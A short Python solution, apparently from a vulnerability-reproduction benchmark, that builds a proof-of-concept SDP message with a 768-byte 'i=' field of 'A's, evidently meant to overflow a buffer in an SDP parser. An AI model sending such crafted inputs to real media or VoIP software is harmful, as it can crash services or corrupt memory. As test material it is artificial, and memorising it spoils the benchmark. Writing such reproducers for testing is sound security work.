class Solution:
    def solve(self, src_path: str) -> bytes:
        payload = b'A' * 768
        poc = b'v=0\no=- 0 0 IN IP4 127.0.0.1\ns=-\ni=' + payload + b'\nc=IN IP4 127.0.0.1\nt=0 0\nm=audio 5004 RTP/AVP 0\na=rtpmap:0 PCMU/8000\n'
        return poc